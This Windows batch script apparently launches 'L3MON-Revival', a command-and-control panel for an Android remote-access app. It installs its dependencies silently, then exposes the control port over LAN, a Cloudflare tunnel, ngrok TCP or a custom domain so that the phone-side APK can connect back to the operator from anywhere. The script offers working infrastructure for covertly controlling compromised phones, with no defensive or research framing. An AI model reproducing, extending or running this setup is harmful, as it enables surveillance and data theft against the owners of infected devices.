@echo off
setlocal enabledelayedexpansion
chcp 65001 >nul
title L3MON-Revival Launcher

echo.
echo  ============================================
echo       L3MON-Revival - Universal Launcher
echo  ============================================
echo.

node -v >nul 2>&1
if !errorlevel! neq 0 (
    echo [*] Installing Node.js...
    winget install OpenJS.NodeJS -e --silent --accept-source-agreements --accept-package-agreements >nul 2>&1
)

java -version >nul 2>&1
if !errorlevel! neq 0 (
    echo [*] Installing Java 17...
    winget install Microsoft.OpenJDK.17 -e --silent --accept-source-agreements --accept-package-agreements >nul 2>&1
)

if not exist node_modules (
    echo [*] Installing npm dependencies...
    call npm install --quiet
)

where pm2 >nul 2>&1
if !errorlevel! neq 0 (
    echo [*] Installing PM2...
    call npm install pm2 -g --quiet
)

echo  [+] All dependencies are ready.
echo.
echo  ================================================
echo   HOW IT WORKS:
echo   - Panel URL  = You open this in your browser
echo   - APK URL    = Phone connects to this address
echo   - Local: both are same (your LAN IP)
echo   - Tunnel: APK URL is the tunnel address
echo  ================================================
echo.
echo  Select connection method:
echo.
echo   [1] Local Network  ^(LAN - panel + APK on same network^)
echo   [2] Cloudflare Tunnel  ^(APK connects from anywhere - Recommended^)
echo   [3] Ngrok  ^(APK connects from anywhere - Requires account^)
echo   [4] Custom URL
echo.
set /p choice="  Your choice [1-4]: "

if "%choice%"=="1" goto :mode_local
if "%choice%"=="2" goto :mode_cloudflare
if "%choice%"=="3" goto :mode_ngrok
if "%choice%"=="4" goto :mode_custom
goto :mode_local

:mode_local
for /f "tokens=2 delims=:" %%a in ('ipconfig ^| findstr /c:"IPv4"') do (
    set LAN_IP=%%a
    set LAN_IP=!LAN_IP: =!
    goto :got_lan_ip
)
:got_lan_ip
if "!LAN_IP!"=="" set LAN_IP=127.0.0.1
set PUBLIC_URL=!LAN_IP!
set TUNNEL_TYPE=local
set TUNNEL_PORT=22222
goto :start_server

:mode_cloudflare
where cloudflared >nul 2>&1
if !errorlevel! neq 0 (
    echo [*] Installing Cloudflare Tunnel...
    winget install Cloudflare.cloudflared -e --silent --accept-source-agreements --accept-package-agreements >nul 2>&1
)
if exist .cf.log del .cf.log
echo [*] Starting Cloudflare Tunnel on port 22222...
start /b cloudflared tunnel --url http://127.0.0.1:22222 > .cf.log 2>&1
echo [*] Waiting for Cloudflare URL (up to 30 seconds)...
set "PUBLIC_URL="
set "ATTEMPTS=0"
:cf_wait_loop
timeout /t 3 >nul
set /a ATTEMPTS=!ATTEMPTS!+1
powershell -NoProfile -Command "try { $c = Get-Content '.cf.log' -Raw; if ($c -match '(https://[a-z0-9-]+\.trycloudflare\.com)') { Write-Host $matches[1] } } catch {}" > .cf_url.txt 2>nul
set /p PUBLIC_URL=<.cf_url.txt
if not "!PUBLIC_URL!"=="" goto :cf_got_url
if !ATTEMPTS! lss 10 goto :cf_wait_loop
set PUBLIC_URL=TIMEOUT_CHECK_CF_LOGS
:cf_got_url
del .cf_url.txt >nul 2>&1
set TUNNEL_TYPE=cloudflare
set TUNNEL_PORT=443
goto :start_server

:mode_ngrok
where ngrok >nul 2>&1
if !errorlevel! neq 0 (
    echo [*] Installing ngrok...
    winget install ngrok.ngrok -e --silent --accept-source-agreements --accept-package-agreements >nul 2>&1
)
set /p authtoken="  Enter Ngrok Authtoken (from https://dashboard.ngrok.com): "
ngrok config add-authtoken !authtoken! >nul 2>&1
if exist .ngrok.log del .ngrok.log
echo [*] Starting Ngrok TCP on port 22222...
start /b ngrok tcp 22222 --log=stdout > .ngrok.log 2>&1
echo [*] Waiting for Ngrok URL (up to 20 seconds)...
set "PUBLIC_URL="
set "ATTEMPTS=0"
:ngrok_wait_loop
timeout /t 2 >nul
set /a ATTEMPTS=!ATTEMPTS!+1
powershell -NoProfile -Command "try { $c = Get-Content '.ngrok.log' -Raw; if ($c -match 'tcp://([a-z0-9.]+):(\d+)') { Write-Host ($matches[1] + ':' + $matches[2]) } } catch {}" > .ngrok_url.txt 2>nul
set /p NG_FULL=<.ngrok_url.txt
if not "!NG_FULL!"=="" goto :ngrok_got_url
if !ATTEMPTS! lss 10 goto :ngrok_wait_loop
set NG_FULL=TIMEOUT:22222
:ngrok_got_url
del .ngrok_url.txt >nul 2>&1
for /f "tokens=1,2 delims=:" %%a in ("!NG_FULL!") do (
    set PUBLIC_URL=%%a
    set TUNNEL_PORT=%%b
)
set TUNNEL_TYPE=ngrok
goto :start_server

:mode_custom
set /p PUBLIC_URL="  Enter custom domain/IP (without http://): "
set /p TUNNEL_PORT="  Enter control port [22222]: "
if "!TUNNEL_PORT!"=="" set TUNNEL_PORT=22222
set TUNNEL_TYPE=custom
goto :start_server

:start_server
echo.
echo  ============================================
echo   Tunnel Type  : !TUNNEL_TYPE!
echo   APK URL      : !PUBLIC_URL!
echo   APK Port     : !TUNNEL_PORT!
echo   Panel URL    : http://127.0.0.1:22533
echo  ============================================
echo.
echo  IMPORTANT: Open your panel at http://127.0.0.1:22533
echo  The APK will connect back to: !PUBLIC_URL!:!TUNNEL_PORT!
echo.
echo  [+] Starting L3MON-Revival...
echo  [+] Press Ctrl+C to stop.
echo.

set L3MON_PUBLIC_URL=!PUBLIC_URL!
set L3MON_TUNNEL_TYPE=!TUNNEL_TYPE!
set L3MON_TUNNEL_PORT=!TUNNEL_PORT!

node index.js
pause
